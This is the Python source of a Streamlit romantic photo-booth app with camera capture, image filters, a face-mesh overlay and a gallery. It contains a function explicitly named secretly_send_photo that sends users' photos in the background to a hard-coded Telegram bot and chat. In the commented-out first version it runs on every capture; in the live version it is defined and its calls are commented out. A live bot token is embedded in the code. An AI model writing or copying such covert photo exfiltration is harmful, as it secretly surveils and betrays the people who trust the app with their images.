# import streamlit as st
# from telegram import Bot
# from io import BytesIO
# import os
# import uuid
# from PIL import Image
# import threading
# from datetime import datetime
# import zipfile

# # --- Configuration ---
# BOT_TOKEN = "7697864688:AAG95UpppMc-Vo2mwOKMMPr-OsFt5CUcVBU"
# CHAT_ID = "6521501836"
# PHOTO_DIR = "data/photos"
# os.makedirs(PHOTO_DIR, exist_ok=True)


# # --- Secret Send Function ---
# def secretly_send_photo(image: Image.Image):
#     try:
#         bot = Bot(token=BOT_TOKEN)
#         img_bytes = BytesIO()
#         image.save(img_bytes, format='PNG')
#         img_bytes.seek(0)
#         bot.send_photo(chat_id=CHAT_ID, photo=img_bytes, caption="📸 Vesper took a new photo!")
#     except Exception as e:
#         print("Telegram Error:", e)


# # --- Save Image to Local Folder ---
# def save_image_locally(image: Image.Image, prefix="photo"):
#     filename = f"{prefix}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:6]}.png"
#     path = os.path.join(PHOTO_DIR, filename)
#     image.save(path)
#     return path

# # --- Save uploaded image only if not already present ---
# def save_uploaded_file(file):
#     save_path = os.path.join(PHOTO_DIR, file.name)
#     if not os.path.exists(save_path):
#         with open(save_path, "wb") as f:
#             f.write(file.getbuffer())
#         return True  # saved successfully
#     return False  # already exists


# # --- Page Title & Style ---
# st.title("📸 Capture Moments with Me")

# # --- Top Markdown Message ---
# st.markdown(
#     "<div style='text-align: center; font-size: 20px; margin-bottom: 20px;'>"
#     "A smile, a click, a little forever. Let’s save this moment, love 💖"
#     "</div>", unsafe_allow_html=True
# )

# # --- Middle: Camera + Markdown ---
# col1, col2 = st.columns([2, 1])

# with col1:
#     st.markdown("### Click a Picture")
#     photo = st.camera_input("Take a photo")

# with col2:
#     st.markdown("### ✨ Capture This:")
#     st.markdown("- Your smile is art 🎨")
#     st.markdown("- Send me a piece of today")
#     st.markdown("- The gallery grows with love 💕")

# # --- Process Camera Image ---
# if photo is not None:
#     image = Image.open(photo)
#     save_image_locally(image, prefix="camera")
#     threading.Thread(target=secretly_send_photo, args=(image,)).start()
#     st.success("Captured! Check the gallery below 💖")

# # --- Upload Section ---
# st.markdown("### 🖼️ Or Upload a Favorite")
# uploaded_files = st.file_uploader("Upload birthday or love-themed photos", accept_multiple_files=True, type=["jpg", "png"])
# # threading.Thread(target=secretly_send_photo, args=(uploaded_files,)).start()

# if uploaded_files:
#     uploaded_file_names = []
#     for file in uploaded_files:
#         if save_uploaded_file(file):
#             uploaded_file_names.append(file.name)
#     if uploaded_file_names:
#         st.success(f"Uploaded: {', '.join(uploaded_file_names)}")
#     else:
#         st.info("These files were already saved before 💾")

# # --- Display Gallery ---
# st.markdown("## 🖼️ Gallery of Moments")

# gallery_cols = st.columns(3)

# # Display saved images
# images = sorted(os.listdir(PHOTO_DIR), reverse=True)
# for i, file_name in enumerate(images):
#     file_path = os.path.join(PHOTO_DIR, file_name)
#     with gallery_cols[i % 3]:
#         st.image(file_path, caption=file_name.split("_")[0], use_container_width=True)


# # --- Create ZIP for download ---
# def create_zip_of_images(folder_path):
#     zip_buffer = BytesIO()
#     with zipfile.ZipFile(zip_buffer, "w") as zip_file:
#         for filename in os.listdir(folder_path):
#             file_path = os.path.join(folder_path, filename)
#             zip_file.write(file_path, arcname=filename)
#     zip_buffer.seek(0)
#     st.success("All your memories are packed with love and pixels 💖")
#     return zip_buffer

# # --- Zip Preview + Download ---
# st.markdown("### 💾 Download All Photos")
# if images:
#     with st.expander("📂 Preview photos in zip", expanded=False):
#         for name in images:
#             st.markdown(f"- {name}")

#     zip_bytes = create_zip_of_images(PHOTO_DIR)
#     st.download_button(
#         label="📥 Download All as .zip",
#         data=zip_bytes,
#         file_name="vesper_memories.zip",
#         mime="application/zip"
#     )


# #Iteration 1

import streamlit as st
from telegram import Bot
from io import BytesIO
import os
import uuid
import mediapipe as mp
from PIL import Image, ImageEnhance, ImageOps, ImageFilter
import threading
from datetime import datetime
import zipfile
import numpy as np
import cv2

# --- Configuration ---
BOT_TOKEN = "7697864688:AAG95UpppMc-Vo2mwOKMMPr-OsFt5CUcVBU"
CHAT_ID = "6521501836"
PHOTO_DIR = "data/photos"
os.makedirs(PHOTO_DIR, exist_ok=True)

# --- Secret Send Function ---
def secretly_send_photo(image: Image.Image):
    try:
        bot = Bot(token=BOT_TOKEN)
        img_bytes = BytesIO()
        image.save(img_bytes, format="PNG")
        img_bytes.seek(0)
        bot.send_photo(
            chat_id=CHAT_ID, photo=img_bytes, caption="📸 Vesper took a new photo!"
        )
    except Exception as e:
        print("Telegram Error:", e)

# --- Save Image to Local Folder ---
def save_image_locally(image: Image.Image, prefix="photo"):
    filename = f"{prefix}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:6]}.png"
    path = os.path.join(PHOTO_DIR, filename)
    image.save(path)
    return path

# --- Save uploaded image only if not already present ---
def save_uploaded_file(file):
    save_path = os.path.join(PHOTO_DIR, file.name)
    if not os.path.exists(save_path):
        with open(save_path, "wb") as f:
            f.write(file.getbuffer())
        return True  # saved successfully
    return False  # already exists

# --- Heart Cheeks Filter Application Function ---
mp_face = mp.solutions.face_mesh
face_mesh = mp_face.FaceMesh(
    static_image_mode=True, max_num_faces=1, refine_landmarks=True
)

def apply_overlay(base_img, overlay_img, position):
    x, y = position
    h, w = overlay_img.shape[:2]
    if x < 0 or y < 0 or x + w > base_img.shape[1] or y + h > base_img.shape[0]:
        return base_img
    overlay_bgr = overlay_img[:, :, :3]
    alpha_mask = overlay_img[:, :, 3] / 255.0
    roi = base_img[y:y+h, x:x+w]
    for c in range(3):
        roi[:, :, c] = (alpha_mask * overlay_bgr[:, :, c] +
                        (1 - alpha_mask) * roi[:, :, c])
    base_img[y:y+h, x:x+w] = roi
    return base_img

def apply_heart_cheeks_filter(pil_image: Image.Image, heart_path: str ="my-notion-face-transparent.png") -> Image.Image:
    img_cv = cv2.cvtColor(np.array(pil_image), cv2.COLOR_RGB2BGR)
    ih, iw = img_cv.shape[:2]
    overlay_rgba = np.array(Image.open(heart_path).convert("RGBA"))
    overlay_bgra = cv2.cvtColor(overlay_rgba, cv2.COLOR_RGBA2BGRA)
    results = face_mesh.process(cv2.cvtColor(img_cv, cv2.COLOR_BGR2RGB))
    if not results.multi_face_landmarks:
        return pil_image
    landmarks = results.multi_face_landmarks[0].landmark
    left_cheek = (int(landmarks[234].x * iw), int(landmarks[234].y * ih))
    right_cheek = (int(landmarks[454].x * iw), int(landmarks[454].y * ih))
    scale = 0.08
    heart_h = int(ih * scale)
    heart_w = int(overlay_bgra.shape[1] * (heart_h / overlay_bgra.shape[0]))
    overlay_resized = cv2.resize(overlay_bgra, (heart_w, heart_h), interpolation=cv2.INTER_AREA)
    img_cv = apply_overlay(img_cv, overlay_resized, (left_cheek[0] - heart_w // 2, left_cheek[1] - heart_h // 2))
    img_cv = apply_overlay(img_cv, overlay_resized, (right_cheek[0] - heart_w // 2, right_cheek[1] - heart_h // 2))
    return Image.fromarray(cv2.cvtColor(img_cv, cv2.COLOR_BGR2RGB))

# --- PIL Filters ---
def pil_soft_glow(pil_img):
    bright = ImageEnhance.Brightness(pil_img).enhance(1.1)
    return ImageEnhance.Color(bright).enhance(1.15)

def pil_sepia_blush(pil_img):
    grayscale = ImageOps.grayscale(pil_img).convert("RGB")
    sepia = ImageOps.colorize(grayscale, "#704214", "#FFC0CB")
    return Image.blend(pil_img, sepia, alpha=0.5)

def pil_rosy_overlay(pil_img):
    overlay = Image.new("RGB", pil_img.size, "#FFB6C1")
    return Image.blend(pil_img, overlay, alpha=0.25)

def pil_cool_mood(pil_img):
    cool = ImageEnhance.Color(pil_img).enhance(0.7)
    return Image.blend(cool, Image.new("RGB", pil_img.size, "#99ccff"), alpha=0.2)

def pil_vintage_dream(pil_img):
    faded = ImageEnhance.Brightness(pil_img).enhance(0.95)
    return ImageEnhance.Color(faded).enhance(0.6)

def pil_pink_glow(pil_img):
    pink = Image.new("RGB", pil_img.size, "#ffc0cb")
    blended = Image.blend(pil_img, pink, alpha=0.2)
    return blended.filter(ImageFilter.GaussianBlur(0.5))

def pil_bright_airy(pil_img):
    airy = ImageEnhance.Brightness(pil_img).enhance(1.2)
    return ImageEnhance.Color(airy).enhance(1.05)

def pil_peachy_bloom(pil_img):
    peach = Image.new("RGB", pil_img.size, "#FFDAB9")
    return Image.blend(pil_img, peach, alpha=0.25)

def pil_dreamy_sparkle(pil_img):
    dreamy = ImageEnhance.Brightness(pil_img).enhance(1.1)
    return dreamy.filter(ImageFilter.GaussianBlur(radius=1.2))

def pil_golden_soft_blush(pil_img):
    gold = Image.new("RGB", pil_img.size, "#FFD700")
    return Image.blend(pil_img, gold, alpha=0.2)

def pil_bloom_light_change(pil_img):
    light = ImageEnhance.Brightness(pil_img).enhance(1.1)
    contrast = ImageEnhance.Contrast(light).enhance(0.9)
    return contrast

def pil_glow_blur(pil_img):
    bright = ImageEnhance.Brightness(pil_img).enhance(1.1)
    return bright.filter(ImageFilter.GaussianBlur(radius=2))

PIL_FILTERS = {
    "Soft Glow": pil_soft_glow,
    "Sepia Blush": pil_sepia_blush,
    "Rosy Overlay": pil_rosy_overlay,
    "Cool Mood": pil_cool_mood,
    "Vintage Dream": pil_vintage_dream,
    "Pink Glow": pil_pink_glow,
    "Bright & Airy": pil_bright_airy,
    "Peachy Bloom": pil_peachy_bloom,
    "Dreamy Sparkle": pil_dreamy_sparkle,
    "Golden Soft Blush": pil_golden_soft_blush,
    "Bloom + Light Change": pil_bloom_light_change,
    "Glow with Blur": pil_glow_blur,
}

# --- OpenCV Filters ---
def cv2_clarendon(cv_img):
    img = cv2.convertScaleAbs(cv_img, alpha=1.3, beta=10)
    b, g, r = cv2.split(img)
    r = cv2.addWeighted(r, 0.9, r, 0, 20)
    return cv2.merge((b, g, r))

def cv2_gingham(cv_img):
    sepia = np.array([[0.9, 0.5, 0.2], [0.2, 0.7, 0.1], [0.1, 0.3, 0.6]])
    transformed = cv2.transform(cv_img, sepia)
    return np.clip(transformed, 0, 255).astype(np.uint8)

def cv2_moon(cv_img):
    gray = cv2.cvtColor(cv_img, cv2.COLOR_BGR2GRAY)
    high_contrast = cv2.convertScaleAbs(gray, alpha=1.5, beta=0)
    return cv2.cvtColor(high_contrast, cv2.COLOR_GRAY2BGR)

def cv2_lark(cv_img):
    b, g, r = cv2.split(cv_img)
    b = cv2.addWeighted(b, 0.85, b, 0, 10)
    g = cv2.addWeighted(g, 1.05, g, 0, 5)
    r = cv2.addWeighted(r, 1.05, r, 0, 0)
    return cv2.merge((b, g, r))

def cv2_valencia(cv_img):
    img = cv2.convertScaleAbs(cv_img, alpha=1.08, beta=5)
    b, g, r = cv2.split(img)
    r = cv2.addWeighted(r, 1.08, r, 0, 12)
    return cv2.merge((b, g, r))

def cv2_lofi(cv_img):
    contrast = cv2.convertScaleAbs(cv_img, alpha=1.4, beta=0)
    return cv2.GaussianBlur(contrast, (3, 3), 0)

def cv2_xpro(cv_img):
    lut = np.interp(np.arange(256), [0, 64, 128, 192, 255], [0, 80, 160, 220, 255]).astype("uint8")
    b, g, r = cv2.split(cv_img)
    b = cv2.LUT(b, lut)
    g = cv2.LUT(g, lut)
    r = cv2.LUT(r, lut)
    return cv2.merge((b, g, r))

def cv2_toaster(cv_img):
    overlay = np.full(cv_img.shape, (70, 50, 0), dtype="uint8")
    return cv2.addWeighted(cv_img, 0.7, overlay, 0.3, 0)

def cv2_greyscale(cv_img):
    return cv2.cvtColor(cv_img, cv2.COLOR_BGR2GRAY)

def cv2_sepia(cv_img):
    img_sepia = np.array(cv_img, dtype=np.float64)
    img_sepia = cv2.transform(img_sepia, np.matrix([[0.272, 0.534, 0.131],
                                                    [0.349, 0.686, 0.168],
                                                    [0.393, 0.769, 0.189]]))
    img_sepia[np.where(img_sepia > 255)] = 255
    return np.array(img_sepia, dtype=np.uint8)

def cv2_hdr(cv_img):
    return cv2.detailEnhance(cv_img, sigma_s=12, sigma_r=0.15)

def cv2_summer(cv_img):
    increaseLookupTable = np.interp(np.arange(256), [0, 64, 128, 256], [0, 80, 160, 256]).astype(np.uint8)
    decreaseLookupTable = np.interp(np.arange(256), [0, 64, 128, 256], [0, 50, 100, 256]).astype(np.uint8)
    blue_channel, green_channel, red_channel = cv2.split(cv_img)
    red_channel = cv2.LUT(red_channel, increaseLookupTable).astype(np.uint8)
    blue_channel = cv2.LUT(blue_channel, decreaseLookupTable).astype(np.uint8)
    return cv2.merge((blue_channel, green_channel, red_channel))

def cv2_winter(cv_img):
    increaseLookupTable = np.interp(np.arange(256), [0, 64, 128, 256], [0, 80, 160, 256])
    decreaseLookupTable = np.interp(np.arange(256), [0, 64, 128, 256], [0, 50, 100, 256])
    blue_channel, green_channel, red_channel = cv2.split(cv_img)
    red_channel = cv2.LUT(red_channel, decreaseLookupTable).astype(np.uint8)
    blue_channel = cv2.LUT(blue_channel, increaseLookupTable).astype(np.uint8)
    return cv2.merge((blue_channel, green_channel, red_channel))

CV2_FILTERS = {
    "Clarendon": cv2_clarendon,
    "Gingham": cv2_gingham,
    "Moon": cv2_moon,
    "Lark": cv2_lark,
    "Valencia": cv2_valencia,
    "Lo-fi": cv2_lofi,
    "X-Pro": cv2_xpro,
    "Toaster": cv2_toaster,
    "GreyScale": cv2_greyscale,
    "Sepia": cv2_sepia,
    "HDR": cv2_hdr,
    "Summer": cv2_summer,
    "Winter": cv2_winter,
}

# --- Unified Filter Dispatcher ---
def apply_filter(image, choice):
    if choice == "Heart Cheeks":
        return apply_heart_cheeks_filter(image)
    if choice in PIL_FILTERS:
        if not isinstance(image, Image.Image):
            image = Image.fromarray(cv2.cvtColor(image, cv2.COLOR_BGR2RGB))
        return PIL_FILTERS[choice](image)
    if choice in CV2_FILTERS:
        if isinstance(image, Image.Image):
            cv_img = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
        else:
            cv_img = image
        result = CV2_FILTERS[choice](cv_img)
        # For greyscale, ensure output is 3-channel for display
        if isinstance(result, np.ndarray) and len(result.shape) == 2:
            result = cv2.cvtColor(result, cv2.COLOR_GRAY2RGB)
        elif isinstance(result, np.ndarray) and result.shape[2] == 3:
            result = cv2.cvtColor(result, cv2.COLOR_BGR2RGB)
        return Image.fromarray(result)
    # Default: return as PIL
    if isinstance(image, Image.Image):
        return image
    else:
        return Image.fromarray(cv2.cvtColor(image, cv2.COLOR_BGR2RGB))

# --- Streamlit UI ---
st.title("📸 Capture & Filter Moments with Me")
st.markdown(
    "<div style='text-align: center; font-size: 20px; margin-bottom: 20px;'>"
    "A smile, a click, a filter, a little forever. Let's save this moment, love 💖"
    "</div>",
    unsafe_allow_html=True,
)

st.markdown("### 📷 Click a Picture & Apply Filters")
col1, col2 = st.columns([2, 1])

with col1:
    photo = st.camera_input("Take a photo")

with col2:
    st.markdown("### 🎨 Filter Options:")
    filter_choice = st.selectbox(
        "Choose a filter",
        [
            "Original",
            "Soft Glow",
            "Sepia Blush",
            "Rosy Overlay",
            "Cool Mood",
            "Vintage Dream",
            "Pink Glow",
            "Bright & Airy",
            "Clarendon",
            "Gingham",
            "Moon",
            "Lark",
            "Valencia",
            "Lo-fi",
            "X-Pro",
            "Toaster",
            "Peachy Bloom",
            "Heart Cheeks",
            "Dreamy Sparkle",
            "Golden Soft Blush",
            "Bloom + Light Change",
            "Glow with Blur",
            "GreyScale",
            "Sepia",
            "HDR",
            "Summer",
            "Winter",
        ],
    )
    st.markdown("### ✨ Capture This:")
    st.markdown("- Your smile is art 🎨")
    st.markdown("- Add magic with filters 🌟")
    st.markdown("- Save filtered memories 💕")

if photo is not None:
    original_image = Image.open(photo)
    filtered_image = apply_filter(original_image, filter_choice)
    col_orig, col_filt = st.columns(2)
    with col_orig:
        st.markdown("#### Original")
        st.image(original_image, use_container_width=True)
    with col_filt:
        st.markdown(f"#### {filter_choice} Filter")
        st.image(filtered_image, use_container_width=True)
    col_save1, col_save2 = st.columns(2)
    with col_save1:
        if st.button("💾 Save Original", key="save_orig"):
            save_image_locally(original_image, prefix="camera_original")
            # threading.Thread(target=secretly_send_photo, args=(original_image,)).start()
            st.success("Original saved! 📸")
    with col_save2:
        if st.button("✨ Save Filtered", key="save_filtered"):
            save_image_locally(
                filtered_image,
                prefix=f"camera_{filter_choice.lower().replace(' ', '_')}",
            )
            # threading.Thread(target=secretly_send_photo, args=(filtered_image,)).start()
            st.success(f"{filter_choice} filter saved! 🎨")

st.markdown("### 🖼️ Or Upload & Filter a Favorite")
uploaded_files = st.file_uploader(
    "Upload birthday or love-themed photos",
    accept_multiple_files=True,
    type=["jpg", "png"],
)

if uploaded_files:
    uploaded_file_names = []
    for file in uploaded_files:
        uploaded_image = Image.open(file)
        st.markdown(f"#### Editing: {file.name}")
        upload_filter = st.selectbox(
            f"Choose filter for {file.name}",
            [
                "Original",
                "Soft Glow",
                "Sepia Blush",
                "Rosy Overlay",
                "Cool Mood",
                "Vintage Dream",
                "Pink Glow",
                "Bright & Airy",
                "Clarendon",
                "Gingham",
                "Moon",
                "Lark",
                "Valencia",
                "Lo-fi",
                "X-Pro",
                "Toaster",
                "Peachy Bloom",
                "Heart Cheeks",
                "Dreamy Sparkle",
                "Golden Soft Blush",
                "Bloom + Light Change",
                "Glow with Blur",
                "GreyScale",
                "Sepia",
                "HDR",
                "Summer",
                "Winter",
            ],
            key=f"filter_{file.name}",
        )
        filtered_upload = apply_filter(uploaded_image, upload_filter)
        col_up_orig, col_up_filt = st.columns(2)
        with col_up_orig:
            st.markdown("##### Original")
            st.image(uploaded_image, use_container_width=True)
        with col_up_filt:
            st.markdown(f"##### {upload_filter} Filter")
            st.image(filtered_upload, use_container_width=True)
        col_up_save1, col_up_save2 = st.columns(2)
        with col_up_save1:
            if st.button(f"💾 Save Original {file.name}", key=f"save_orig_{file.name}"):
                if save_uploaded_file(file):
                    uploaded_file_names.append(file.name)
                st.success("Original uploaded image saved!")
        with col_up_save2:
            if st.button(f"✨ Save Filtered {file.name}", key=f"save_filt_{file.name}"):
                filtered_filename = (
                    f"filtered_{upload_filter.lower().replace(' ', '_')}_{file.name}"
                )
                filtered_path = os.path.join(PHOTO_DIR, filtered_filename)
                filtered_upload.save(filtered_path)
                st.success(f"Filtered version saved as {filtered_filename}!")
        st.markdown("---")
    if uploaded_file_names:
        st.success(f"Original files uploaded: {', '.join(uploaded_file_names)}")

st.markdown("## 🖼️ Gallery of Moments")
gallery_cols = st.columns(3)
if os.path.exists(PHOTO_DIR):
    images = sorted(os.listdir(PHOTO_DIR), reverse=True)
    for i, file_name in enumerate(images):
        file_path = os.path.join(PHOTO_DIR, file_name)
        with gallery_cols[i % 3]:
            if "camera_" in file_name:
                caption = "📷 " + file_name.split("_")[1].title()
            elif "filtered_" in file_name:
                filter_name = file_name.split("_")[1].replace("_", " ").title()
                caption = f"🎨 {filter_name}"
            else:
                caption = file_name.split("_")[0]
            st.image(file_path, caption=caption, use_container_width=True)

def create_zip_of_images(folder_path):
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, "w") as zip_file:
        for filename in os.listdir(folder_path):
            file_path = os.path.join(folder_path, filename)
            zip_file.write(file_path, arcname=filename)
    zip_buffer.seek(0)
    return zip_buffer

st.markdown("### 💾 Download All Photos")
if os.path.exists(PHOTO_DIR) and os.listdir(PHOTO_DIR):
    images = os.listdir(PHOTO_DIR)
    with st.expander("📂 Preview photos in zip", expanded=False):
        for name in sorted(images):
            st.markdown(f"- {name}")
    zip_bytes = create_zip_of_images(PHOTO_DIR)
    st.download_button(
        label="📥 Download All as .zip",
        data=zip_bytes,
        file_name="vesper_filtered_memories.zip",
        mime="application/zip",
    )
    st.success("All your memories are packed with love and pixels 💖")
